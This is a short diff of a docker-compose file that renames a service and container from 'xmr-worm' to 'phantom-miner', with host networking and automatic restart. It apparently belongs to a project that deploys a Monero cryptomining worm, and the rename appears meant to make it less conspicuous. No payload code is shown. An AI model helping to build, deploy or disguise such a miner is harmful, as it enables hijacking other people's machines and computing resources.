@@ -1,9 +1,9 @@
 version: '3.8'
 
 services:
-  xmr-worm:
+  phantom-miner:
     build: .
-    container_name: xmr-worm-advanced
+    container_name: phantom-miner
     restart: unless-stopped
     network_mode: host
     volumes:
